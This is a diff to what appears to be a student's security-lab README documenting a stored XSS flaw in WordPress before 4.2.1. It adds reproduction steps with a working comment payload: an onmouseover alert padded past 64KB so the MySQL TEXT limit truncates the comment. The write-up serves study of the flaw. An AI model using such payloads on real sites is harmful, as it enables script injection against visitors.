@@ -74,18 +74,20 @@ Time spent: **5** hours spent in total
     - [ ] Affected source code:
     - [Link 1](https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7)
 5. (Optional) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+  - [ ] Summary: Cross-site scripting (XSS) vulnerability in wp-includes/wp-db.php in WordPress before 4.2.1 allows remote attackers to inject arbitrary web script or HTML via a long comment that is improperly stored because of limitations on the MySQL TEXT data type. 
+    - Vulnerability types:XSS
+    - Tested in version: 4.2 or earlier
+    - Fixed in version: 4.2.1
+  - [ ] GIF Walkthrough:  ![](https://github.com/LizDao/Week7CodePath/blob/master/GIF_Walkthrough/XSS_large_comment.gif)
   - [ ] Steps to recreate: 
+  Crate a block of text with size > 64KB
+  Comment on the website the following code:
+  ```
+  <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  [block of text > 64KB ]'></a>
+  ```
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 
+    - [Link 1](https://core.trac.wordpress.org/changeset/32299) 
 
-## Assets
-
-List any additional assets, such as scripts or files
 
 ## Resources
 
